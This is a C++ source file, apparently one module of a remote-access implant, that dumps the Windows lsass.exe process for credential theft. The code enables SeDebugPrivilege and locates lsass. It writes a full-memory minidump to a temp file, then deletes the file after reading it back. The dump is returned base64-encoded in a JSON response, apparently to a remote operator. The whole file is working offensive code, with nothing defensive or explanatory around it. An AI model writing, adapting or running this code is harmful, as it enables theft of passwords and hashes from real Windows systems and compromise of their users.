// lsass module (B6, Windows only).
//
// Dumps lsass.exe to a temp file via MiniDumpWriteDump, then base64-encodes
// the file into the response. We enable SeDebugPrivilege first. The temp
// file is deleted immediately after read.

#include "../../json.hpp"
#include "../../protocol.h"

#include <dbghelp.h>
#include <windows.h>
#include <psapi.h>
#include <shlobj.h>
#include <string>
#include <vector>

#pragma comment(lib, "dbghelp.lib")

namespace {

bool enable_debug_privilege() {
    HANDLE token = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
        return false;
    }
    LUID luid;
    if (!LookupPrivilegeValueA(nullptr, "SeDebugPrivilege", &luid)) {
        CloseHandle(token);
        return false;
    }
    TOKEN_PRIVILEGES tp{};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    bool ok = AdjustTokenPrivileges(token, FALSE, &tp, sizeof(tp), nullptr, nullptr) != 0;
    CloseHandle(token);
    return ok;
}

std::vector<unsigned char> read_file(const std::string& path) {
    HANDLE h = CreateFileA(path.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr,
                           OPEN_EXISTING, 0, nullptr);
    if (h == INVALID_HANDLE_VALUE) return {};
    LARGE_INTEGER size{};
    if (!GetFileSizeEx(h, &size)) {
        CloseHandle(h);
        return {};
    }
    std::vector<unsigned char> out(static_cast<size_t>(size.QuadPart));
    DWORD read = 0;
    if (!ReadFile(h, out.data(), (DWORD)out.size(), &read, nullptr)) {
        CloseHandle(h);
        return {};
    }
    out.resize(read);
    CloseHandle(h);
    return out;
}

std::string b64(const std::vector<unsigned char>& v) {
    static const char alpha[] =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string out;
    int val = 0, bits = -6;
    for (auto c : v) {
        val = (val << 8) + c;
        bits += 8;
        while (bits >= 0) {
            out.push_back(alpha[(val >> bits) & 0x3F]);
            bits -= 6;
        }
    }
    if (bits > -6) out.push_back(alpha[((val << 8) >> (bits + 8)) & 0x3F]);
    while (out.size() % 4) out.push_back('=');
    return out;
}

} // namespace

namespace nagomio_modules {

std::string handle_lsass(const std::vector<std::string>&) {
    enable_debug_privilege();

    DWORD pid = 0;
    HANDLE hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hsnap == INVALID_HANDLE_VALUE) {
        return std::string(R"({"error":"CreateToolhelp32Snapshot failed"})");
    }
    PROCESSENTRY32 pe{};
    pe.dwSize = sizeof(pe);
    if (Process32FirstA(hsnap, &pe)) {
        do {
            if (std::string(pe.szExeFile) == "lsass.exe") {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextA(hsnap, &pe));
    }
    CloseHandle(hsnap);

    if (!pid) {
        return std::string(R"({"error":"lsass.exe not found"})");
    }

    HANDLE hproc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
                               FALSE, pid);
    if (!hproc) {
        return std::string(R"({"error":"OpenProcess failed"})");
    }

    char tmp_path[MAX_PATH];
    GetTempPathA(sizeof(tmp_path), tmp_path);
    std::string out_path = std::string(tmp_path) + "lsass.dmp";

    HANDLE hfile = CreateFileA(out_path.c_str(), GENERIC_WRITE, 0, nullptr,
                               CREATE_ALWAYS, 0, nullptr);
    if (hfile == INVALID_HANDLE_VALUE) {
        CloseHandle(hproc);
        return std::string(R"({"error":"CreateFileA failed"})");
    }
    BOOL ok = MiniDumpWriteDump(hproc, pid, hfile, MiniDumpWithFullMemory,
                                nullptr, nullptr, nullptr);
    CloseHandle(hfile);
    CloseHandle(hproc);
    if (!ok) {
        DeleteFileA(out_path.c_str());
        return std::string(R"({"error":"MiniDumpWriteDump failed"})");
    }

    auto bytes = read_file(out_path);
    DeleteFileA(out_path.c_str());
    if (bytes.empty()) {
        return std::string(R"({"error":"could not read dump file"})");
    }
    nlohmann::json j = {
        {"type", "lsass_dump"},
        {"size", bytes.size()},
        {"content_base64", b64(bytes)},
    };
    return j.dump();
}

} // namespace nagomio_modules